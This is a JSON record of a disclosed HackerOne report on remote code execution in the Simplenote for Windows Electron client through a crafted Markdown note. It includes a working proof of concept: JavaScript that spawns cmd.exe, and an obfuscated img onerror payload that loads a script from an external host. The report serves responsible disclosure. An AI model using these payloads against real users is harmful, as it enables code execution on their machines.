@@ -1,0 +1,161 @@
+{
+  "id": 291539,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yOTE1Mzk=",
+  "url": "https://hackerone.com/reports/291539",
+  "title": "[Simplenote for Windows] Client RCE via External JavaScript Inclusion leveraging Electron",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2017-11-18T17:57:02.877Z",
+  "submitted_at": "2017-11-18T17:57:02.877Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": true,
+    "username": "ysx",
+    "url": "/ysx",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 111,
+    "url": "https://hackerone.com/automattic",
+    "handle": "automattic",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/111/7f89e1ea233f92916202521a069fdbfe9eced339_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/111/7f89e1ea233f92916202521a069fdbfe9eced339_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Automattic",
+      "twitter_handle": "",
+      "website": "https://automattic.com",
+      "about": "WordPress.com, WooCommerce, WordPress VIP, Jetpack, Beeper, Texts, Akismet, Gravatar, Crowdsignal, Tumblr and more!"
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2017-12-01T13:35:27.401Z",
+  "bug_reporter_agreed_on_going_public_at": "2017-11-29T13:57:03.621Z",
+  "team_member_agreed_on_going_public_at": "2017-12-01T13:35:27.254Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Hi,\n\nA carefully crafted injection in the Markdown parser within Simplenote for Windows can be leveraged to achieve remote code execution via an external JavaScript file. \n\nThe nature of Simplenote's content sharing system, which makes use of tags containing email addresses, means that an adversary could distribute the following proof of concept en-masse to achieve targeted arbitrary code execution, simply requiring the target to \"preview\" the Markdown-formatted note.\n\n## Steps to reproduce\n\n### Prerequisites\nA standard remote web server can be used to create a functional proof of concept. For the purposes of this demonstration, please consider `ysx.bz` the \"adversary\" server.\n\nCreate a new JavaScript file (herein referred to as `hackerone-electron.js`) in the root directory, such that the path would read: `http://ysx.bz/hackerone-electron.js`.\n\n### External JavaScript file\n\nTo prepare our exploit, populate this file with the following JavaScript code:\n\n```\nwrite(\"<h1>Simplenote RCE via Electron - Windows - ysx</h1>\");\nwrite(\"<h3>Proof of concept in progress: popping <pre>netplwiz</pre>. Please stand by!</h3>\");\nvar Process = process.binding('process_wrap').Process;\nvar proc = new Process();\nproc.onexit = function(a,b) {};\nvar env = process.env;\nvar env_ = [];\nfor (var key in env) env_.push(key+'='+env[key]);\nproc.spawn({file:'cmd.exe',args:['/k netplwiz'],cwd:null,windowsVerbatimArguments:false,detached:false,envPairs:env_,stdio:[{type:'ignore'},{type:'ignore'},{type:'ignore'}]});\n```\n\n### Encoding and exploitation\n\nNext, please open a JavaScript `eval` [encoder](https://www.martineve.com/2007/05/15/javascript-eval-string-fromcharcode-encoder/) and encode the following payload, modifying the JavaScript source URL as appropriate. This will be used within an `<img>` tag as part of the crafted note.\n\n```\nvar js = document.createElement('script'); js.type = 'text/javascript'; js.src = 'http://ysx.bz/hackerone-electron.js'; document.body.appendChild(js);\n```\n\nThe above example should encode as follows:\n\n```\neval(String.fromCharCode(118,97,114,32,106,115,32,61,32,100,111,99,117,109,101,110,116,46,99,114,101,97,116,101,69,108,101,109,101,110,116,40,39,115,99,114,105,112,116,39,41,59,32,106,115,46,116,121,112,101,32,61,32,39,116,101,120,116,47,106,97,118,97,115,99,114,105,112,116,39,59,32,106,115,46,115,114,99,32,61,32,39,104,116,116,112,58,47,47,121,115,120,46,98,122,47,104,97,99,107,101,114,111,110,101,45,101,108,101,99,116,114,111,110,46,106,115,39,59,32,100,111,99,117,109,101,110,116,46,98,111,100,121,46,97,112,112,101,110,100,67,104,105,108,100,40,106,115,41,59))\n```\n\nNext, create a new Markdown note within Simplenote for Windows, and paste the following `<img>` tag code.\n\n```\n## Test Note\n### HackerOne Windows RCE PoC - pops \"netplwiz\"\n\n<img src=x onerror=eval(String.fromCharCode(118,97,114,32,106,115,32,61,32,100,111,99,117,109,101,110,116,46,99,114,101,97,116,101,69,108,101,109,101,110,116,40,39,115,99,114,105,112,116,39,41,59,32,106,115,46,116,121,112,101,32,61,32,39,116,101,120,116,47,106,97,118,97,115,99,114,105,112,116,39,59,32,106,115,46,115,114,99,32,61,32,39,104,116,116,112,58,47,47,121,115,120,46,98,122,47,104,97,99,107,101,114,111,110,101,45,101,108,101,99,116,114,111,110,46,106,115,39,59,32,100,111,99,117,109,101,110,116,46,98,111,100,121,46,97,112,112,101,110,100,67,104,105,108,100,40,106,115,41,59))>\n```\n\nUpon selecting the **Preview** option of the Markdown note, the JavaScript will be executed. After several seconds, the `netplwiz` executable will launch on your Windows system.\n\n### Supporting evidence\n\n{F240684}\n\n{F240685}\n\n## Verified conditions\n\nAt the time of testing, I have successfully confirmed exploitability in the following environment:\n\n* Simplenote for Windows 1.0.8\n* Windows 10 x64 Home Edition\n\nThanks,\n\nYasin",
+  "weakness": {
+    "id": 70,
+    "name": "Code Injection"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 240684,
+      "file_name": "pre_exploit.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/240/684/6489094751adb742749c66de1ea3375dcc5dc37a/pre_exploit.png?response-content-disposition=attachment%3B%20filename%3D%22pre_exploit.png%22%3B%20filename%2A%3DUTF-8%27%27pre_exploit.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQWPEODDBF%2F20260509%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260509T152510Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEB8aCXVzLXdlc3QtMiJHMEUCIQC29PU%2FjrhrTrwuQy3LCYqDX7UOerD9wzLzz4mr1y37%2BAIgUYd%2FG9GVl%2BwK5Rp%2BxodG0dOErIQ8NZcO3D966hxiDMkquwUI6P%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDEsyD6YaEw%2BDun6YYSqPBYhYjKBX2bPG%2FFuZPmK37I0cJbJBCYOAvXftpysm%2BzXReAWxV6%2FUEbHl1un6%2B%2Bc6%2Fz44dS5%2B57KTilNptTJDUPZZQ8FGJ2AKX5PViJicXrcDMZbAoiFLyH9prJVs%2FwzgnZHX4osrWBFuNA0L7gDeqn9SNQ5Gknukt4vVfR580vRiHCTjBQsFHkXX%2Bs%2BLdf1v1Or7GsRN5H3lgDCnP3HLxEFvmkyB4i3NV0OH9YHSS8t0h2%2BVYGlht0PblS7mXUNl7gZKCaR5Hofafl0RMPHPdoPXTZdqVXV9VEFZJz1G6gQvbBImtHecquEMH%2Fp%2BT%2FCGdxX2U1aEJJCnshObrFAnudfvFrqvpY98eh1ailkKprI1SGbzbGmv%2ByKV3ClxJc5B4vckjM9O%2BC9owspxmNIx76CH4efb1gKtZDPutfIcFJSPgei5AViOYxt5vyGemlkfr9wkSCWqlNo0YEybBy8xdgTFfPIkqyxTmYZYXvQ%2B7NdbJgk8peowaTR7vnDBY5DY4w1XodT3MfYN5vCe45m2Zon7kKtcghPlp87Kk1b1NLWsjfqxLxBEiXc9VFQCcB3CIvYCJZ%2FjLY2Ov%2BFQVnJyPnkIixAJlGcyRtEaoiBqPWo5HFkvJ4%2FWC8YtfDQ%2BVCXqdjFw7KNlaWM4e76l7V5uZRZZIXwMRpUJJAti6e%2FgXP7a9WsS9D4I08H1a1x8h8g7HbjzcJMw0r6gINTJV%2B5NXx73Qxk7RXhqRycxrb473rokw1xPILHgwI36zQn0Ts9sXbwkUwioDWq4ueAOEsCqF0dul8fV4iI6Gbc7do3O%2BAs9bQokeb5KRo74UveVYA8F9w9boCn41xC928jKCUJfiXx1BLMQDWgd4IdDKIaveAcwkI79zwY6sQEbJwA2tB95lkFkWC%2FHXhPskbReU5Ub2jfXdmrffI5v05h%2B4Y7yCH%2BnlPexgdDZsQfvtYmzM0FbTZMHwoeNtm6bCbBQgBrtftx56Ooky6Z%2BIofWcb1M%2FAT5NrmyX99k5BaCJO3yTBLTiQI1EKTjbJQI%2Bc518mAGsJ6A0AZWQWy5oWC5TcNd%2FN4ieUqv10JEIKH%2B3eL5VixEcr9L83YVpmnpiGzV0ulYxlc5rPo%2B1vPLn%2BU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=e883d27fac0fee2e85b7d1258afda1711c67d1726129398cc57a23d52463264a",
+      "file_size": 56819,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 240685,
+      "file_name": "netplwiz_poc.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/240/685/920afb80188088455e32a4001412bf34875d5742/netplwiz_poc.png?response-content-disposition=attachment%3B%20filename%3D%22netplwiz_poc.png%22%3B%20filename%2A%3DUTF-8%27%27netplwiz_poc.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQWPEODDBF%2F20260509%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260509T152510Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEB8aCXVzLXdlc3QtMiJHMEUCIQC29PU%2FjrhrTrwuQy3LCYqDX7UOerD9wzLzz4mr1y37%2BAIgUYd%2FG9GVl%2BwK5Rp%2BxodG0dOErIQ8NZcO3D966hxiDMkquwUI6P%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDEsyD6YaEw%2BDun6YYSqPBYhYjKBX2bPG%2FFuZPmK37I0cJbJBCYOAvXftpysm%2BzXReAWxV6%2FUEbHl1un6%2B%2Bc6%2Fz44dS5%2B57KTilNptTJDUPZZQ8FGJ2AKX5PViJicXrcDMZbAoiFLyH9prJVs%2FwzgnZHX4osrWBFuNA0L7gDeqn9SNQ5Gknukt4vVfR580vRiHCTjBQsFHkXX%2Bs%2BLdf1v1Or7GsRN5H3lgDCnP3HLxEFvmkyB4i3NV0OH9YHSS8t0h2%2BVYGlht0PblS7mXUNl7gZKCaR5Hofafl0RMPHPdoPXTZdqVXV9VEFZJz1G6gQvbBImtHecquEMH%2Fp%2BT%2FCGdxX2U1aEJJCnshObrFAnudfvFrqvpY98eh1ailkKprI1SGbzbGmv%2ByKV3ClxJc5B4vckjM9O%2BC9owspxmNIx76CH4efb1gKtZDPutfIcFJSPgei5AViOYxt5vyGemlkfr9wkSCWqlNo0YEybBy8xdgTFfPIkqyxTmYZYXvQ%2B7NdbJgk8peowaTR7vnDBY5DY4w1XodT3MfYN5vCe45m2Zon7kKtcghPlp87Kk1b1NLWsjfqxLxBEiXc9VFQCcB3CIvYCJZ%2FjLY2Ov%2BFQVnJyPnkIixAJlGcyRtEaoiBqPWo5HFkvJ4%2FWC8YtfDQ%2BVCXqdjFw7KNlaWM4e76l7V5uZRZZIXwMRpUJJAti6e%2FgXP7a9WsS9D4I08H1a1x8h8g7HbjzcJMw0r6gINTJV%2B5NXx73Qxk7RXhqRycxrb473rokw1xPILHgwI36zQn0Ts9sXbwkUwioDWq4ueAOEsCqF0dul8fV4iI6Gbc7do3O%2BAs9bQokeb5KRo74UveVYA8F9w9boCn41xC928jKCUJfiXx1BLMQDWgd4IdDKIaveAcwkI79zwY6sQEbJwA2tB95lkFkWC%2FHXhPskbReU5Ub2jfXdmrffI5v05h%2B4Y7yCH%2BnlPexgdDZsQfvtYmzM0FbTZMHwoeNtm6bCbBQgBrtftx56Ooky6Z%2BIofWcb1M%2FAT5NrmyX99k5BaCJO3yTBLTiQI1EKTjbJQI%2Bc518mAGsJ6A0AZWQWy5oWC5TcNd%2FN4ieUqv10JEIKH%2B3eL5VixEcr9L83YVpmnpiGzV0ulYxlc5rPo%2B1vPLn%2BU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=6e31a45e955d589ad2674c39d9115f65fb615ebfa85b88eceb95f8da3b0d9dba",
+      "file_size": 368083,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2017-12-29T13:57:03.841Z",
+  "allow_singular_disclosure_after": -263784486.73103398,
+  "singular_disclosure_allowed": true,
+  "vote_count": 18,
+  "voters": [
+    "jr0ch17",
+    "sp1d3rs",
+    "europa",
+    "kapytein",
+    "hunter",
+    "asad0x01_",
+    "mpz",
+    "r3y",
+    "eveeez",
+    "vulnh0lic",
+    "and 8 more..."
+  ],
+  "severity": {
+    "rating": "high",
+    "author_type": "User"
+  },
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "id": 5940,
+      "category": "researcher",
+      "content": "It was possible to devise a crafted Markdown note, which when previewed, would lead to arbitrary code execution in the Simplenote client prior to version 1.1.0. A malicious note could be shared with another existing Simplenote user via the tag system.\n\nApplication execution and reverse shell proofs of concept were demonstrated for Windows and Linux. Thanks to @xknown and @roundhill for the swift remediation, and @edio for assisting with the investigation of this issue.\n\nA blogpost on this issue can be found here: https://ysx.me.uk/taking-note-xss-to-rce-in-the-simplenote-electron-client",
+      "updated_at": "2017-11-29T14:11:44.955Z",
+      "can_view?": true,
+      "can_create?": false,
+      "attachments": [],
+      "user": {
+        "id": 47082,
+        "username": "ysx",
+        "name": "",
+        "bio": "",
+        "cleared": false,
+        "verified": false,
+        "website": "",
+        "location": "",
+        "created_at": "2015-12-20T12:11:13.354Z",
+        "url": "https://hackerone.com/ysx",
+        "hackerone_triager": false,
+        "hackerone_employee": false,
+        "user_type": "hacker",
+        "profile_picture_urls": {
+          "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png",
+          "medium": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png",
+          "xtralarge": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
+        }
+      }
+    }
+  ]
+}
